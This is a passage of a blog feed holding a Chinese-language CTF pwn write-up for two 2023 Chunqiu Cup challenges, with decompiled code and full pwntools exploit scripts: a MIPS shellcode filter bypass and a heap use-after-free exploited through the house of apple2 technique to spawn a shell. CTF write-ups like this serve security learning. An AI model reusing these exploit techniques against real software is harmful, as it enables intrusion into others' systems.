class="headerlink" title="sigin_shellcode"></a>sigin_shellcode</h2><p>这里可以直接运行shellcode</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">battle</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> coin; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">void</span> (*func_ptr)(...); <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [sp+28h] [+28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[-]The boss's DEF is 2751\n[-]The boss's ATK is 9999"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[-]Your DEF is 0\n[-]Your ATK is %d\n"</span>, attack);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[-]Now toss a coin to decide who attack first"</span>);</span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  coin = rand() % <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[*]The COIN is %d\n"</span>, coin);</span><br><span class="line">  <span class="keyword">if</span> ( coin == <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+]Boss get the first attack!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+]0 - 9999 = -9999"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Died!!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( coin )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Woring!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]You get the first attack!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]Attacking..."</span>);</span><br><span class="line">  result = attack - <span class="number">2751</span>;</span><br><span class="line">  <span class="keyword">if</span> ( attack - <span class="number">2751</span> &lt; <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your ATK is %d\n"</span>, attack);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You beat the boss!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now open the box which the Princess in."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I have already give you a useful_tools."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Shellcode &gt; "</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>u);</span><br><span class="line">  func_ptr = (<span class="type">void</span> (*)(...))buf;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(buf); ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( !check(buf[i]) )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"[*]BOX: Forbidden!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  useful_tools();</span><br><span class="line">  func_ptr();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>但是需要满足条件，<code>attack - 2751 &lt; 0</code>，并且shellcode需要被check，这里的check很好绕过，<code>li $a1, 0</code>，前面是\x00，直接绕过了strlen</p><p>attack在shop那里，需要满足<code>coin_sum &gt;= 2751</code>，dump出了coin每次rand之后的数，这样coin_sum在100次以内就会大于等于2751</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'mips'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'39.106.131.193'</span>, <span class="number">45307</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process([<span class="string">'./qemu-mipsel-static'</span>, <span class="string">'-L'</span>, <span class="string">'.'</span>, file_name])</span><br><span class="line">    <span class="comment">#r = process(['./qemu-mipsel-static', '-L', '.', '-g', '1234', file_name])</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Go&gt; \n'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>(<span class="params">count</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'How much do you want?\n'</span>, <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shop</span>(<span class="params">stick</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="built_in">str</span>(stick))</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=cdll.LoadLibrary("./lib/libc.so.0")</span></span><br><span class="line"><span class="comment">#libc.srand(0x1BF52)</span></span><br><span class="line"></span><br><span class="line">down(<span class="number">0</span>)</span><br><span class="line">down(<span class="number">1</span>)</span><br><span class="line">down(<span class="number">2</span>)</span><br><span class="line">down(<span class="number">1</span>)</span><br><span class="line">down(<span class="number">4</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">4</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">8</span>)</span><br><span class="line">down(<span class="number">9</span>)</span><br><span class="line">down(<span class="number">8</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0xb</span>)</span><br><span class="line">down(<span class="number">0xe</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x10</span>)</span><br><span class="line">down(<span class="number">0x11</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">9</span>)</span><br><span class="line">down(<span class="number">0xb</span>)</span><br><span class="line">down(<span class="number">0x13</span>)</span><br><span class="line">down(<span class="number">3</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">4</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x11</span>)</span><br><span class="line">down(<span class="number">0x19</span>)</span><br><span class="line">down(<span class="number">0xe</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x1e</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">8</span>)</span><br><span class="line">down(<span class="number">0x21</span>)</span><br><span class="line">down(<span class="number">4</span>)</span><br><span class="line">down(<span class="number">0x11</span>)</span><br><span class="line">down(<span class="number">0x20</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x21</span>)</span><br><span class="line">down(<span class="number">0xb</span>)</span><br><span class="line">down(<span class="number">0</span>)</span><br><span class="line">down(<span class="number">0x29</span>)</span><br><span class="line">down(<span class="number">0x2c</span>)</span><br><span class="line">down(<span class="number">3</span>)</span><br><span class="line">down(<span class="number">6</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x2e</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x32</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x2f</span>)</span><br><span class="line">down(<span class="number">0x11</span>)</span><br><span class="line">down(<span class="number">0x13</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x2b</span>)</span><br><span class="line">down(<span class="number">0x34</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x20</span>)</span><br><span class="line">down(<span class="number">0x3d</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x2c</span>)</span><br><span class="line">down(<span class="number">0x29</span>)</span><br><span class="line">down(<span class="number">0x3c</span>)</span><br><span class="line">down(<span class="number">0x21</span>)</span><br><span class="line">down(<span class="number">0x1a</span>)</span><br><span class="line">down(<span class="number">0x27</span>)</span><br><span class="line">down(<span class="number">1</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">0x34</span>)</span><br><span class="line">down(<span class="number">0x45</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x4a</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x45</span>)</span><br><span class="line">down(<span class="number">0x2c</span>)</span><br><span class="line">down(<span class="number">0x21</span>)</span><br><span class="line">down(<span class="number">0x24</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">0x54</span>)</span><br><span class="line">down(<span class="number">0x2b</span>)</span><br><span class="line">down(<span class="number">0xe</span>)</span><br><span class="line">down(<span class="number">0x55</span>)</span><br><span class="line">down(<span class="number">0x51</span>)</span><br><span class="line">down(<span class="number">0x59</span>)</span><br><span class="line">down(<span class="number">0x12</span>)</span><br><span class="line">down(<span class="number">0x31</span>)</span><br><span class="line">down(<span class="number">0x5c</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">0x18</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x5d</span>)</span><br><span class="line">down(<span class="number">0x5f</span>)</span><br><span class="line">down(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#down(0x1d)</span></span><br><span class="line"></span><br><span class="line">shop(<span class="number">3</span>)</span><br><span class="line">shop(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">down(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = b'\x00\x00' * 2</span></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">li $a2, 0</span></span><br><span class="line"><span class="string">xor $a1, $a1</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">li(disasm(shellcode))</span><br><span class="line">r.send(shellcode)</span><br><span class="line"><span class="comment">#for i in range(10):</span></span><br><span class="line"><span class="comment">#    li(disasm(b'\x00' + b'\\x' + bytes(i)))</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="three-body"><a href="#three-body" class="headerlink" title="three-body"></a>three-body</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1A22</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1554(<span class="string">"Select an area you want to abandon to return: "</span>);</span><br><span class="line">  index = read_input();</span><br><span class="line">  <span class="keyword">if</span> ( heap_ptr[index] )</span><br><span class="line">    <span class="keyword">return</span> sub_16AA(heap_ptr[index]);           <span class="comment">// uaf</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> my_error_write(<span class="string">"You haven't explored the area and can't return from this route."</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>uaf，但是show和edit只可以用一次，add有随机概率，不用管，因为申请的堆块不是太多，add直接当正常的来使用，然后一套house of apple2即可</p><p>笔者一分钟试一次，试了三次就出来了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'39.106.65.236'</span>, <span class="number">16484</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Your choice: '</span></span><br><span class="line"></span><br><span class="line">Meet_the_criteria = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Select an area to explore: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter the size of the range you want to explore this time: '</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'Your decision: (1: yes / 0: no)'</span>, <span class="string">'0'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'It seems that you are confident in yourself, move on.\n'</span>)</span><br><span class="line">    a = r.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">b'Luck'</span>:</span><br><span class="line">        li(<span class="string">'index = '</span> + <span class="built_in">hex</span>(index))</span><br><span class="line">        Meet_the_criteria.append(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Select an area you want to abandon to return: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Please select which area to talk to: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'Since remote calls are costly, enter the specific number of words you want to send: '</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'Please write down your conclusions: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Select to enter an area to receive a signal from the Trisolarans: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x710</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x700</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x700</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x700</span>)</span><br><span class="line">li(Meet_the_criteria)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'\x00'</span> * <span class="number">2</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'heap_addr = '</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line">heap_base = heap_addr</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr - <span class="number">0x219ce0</span></span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.35.so'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x700</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x00000000000562ec</span> + libc_base</span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">heap_base = heap_addr - <span class="number">0xe30</span></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">'_IO_wfile_jumps'</span>]</span><br><span class="line">target_addr = heap_base</span><br><span class="line">one = [<span class="number">0x50a37</span>, <span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>) + p64(leave_ret) + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x20</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0x18</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">1</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0x90</span>, <span class="string">b'\x00'</span>) + p64(target_addr + <span class="number">0xe0</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xc8</span>, <span class="string">b'\x00'</span>) + p64(_IO_wfile_jumps)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xd0</span> + <span class="number">0xe0</span>, <span class="string">b'\x00'</span>) + p64(target_addr + <span class="number">0xe0</span> + <span class="number">0xe8</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xd0</span> + <span class="number">0xe8</span> + <span class="number">0x68</span>, <span class="string">b'\x00'</span>) + p64(one_gadget)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(p2), p2)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x700</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">'5'</span>)</span><br><span class="line">r.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;2023年春秋杯网络安全联赛春季赛PWN-AK&quot;&gt;&lt;a href=&quot;#2023年春秋杯网络安全联赛春季赛PWN-AK&quot; class=&quot;headerlink&quot; title=&quot;2023年春秋杯网络安全联赛春季赛PWN(</summary>
      
    
    
    
    <category term="WP" scheme="https://www.z1r0.top/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://www.z1r0.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>AntCTF x D³CTF 2023 d3op复盘笔记</title>
    <link href="https://www.z1r0.top/2023/05/12/AntCTF-x-D%C2%B3CTF-d3op%E5%A4%8D%E7%9B%98%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.z1r0.top/2023/05/12/AntCTF-x-D%C2%B3CTF-d3op%E5%A4%8D%E7%9B%98%E7%AC%94%E8%AE%B0/</id>
    <published>2023-05-12T06:46:13.000Z</published>
    <updated>2023-08-17T06:28:28.177Z</updated>
    
